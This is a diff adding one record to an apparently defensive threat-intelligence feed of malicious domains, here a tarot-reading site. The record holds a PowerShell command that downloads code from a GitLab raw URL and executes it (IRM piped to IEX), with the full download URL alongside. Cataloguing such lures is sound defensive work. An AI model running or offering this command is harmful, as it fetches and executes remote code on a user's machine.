@@ -346,5 +346,25 @@
     ],
     "ReportId": "cmwn587041vmx0omlbdxa6kbs",
     "ScannedAt": "2026-11-19T06:02:27.071000+00:00"
+  },
+  {
+    "UrlDomain": "consultadetarotbarato.es",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "217.160.0.10"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwn90gcc1vsl0oml5gkbhzu1",
+    "ScannedAt": "2026-11-19T07:48:24.449000+00:00"
   }
 ]
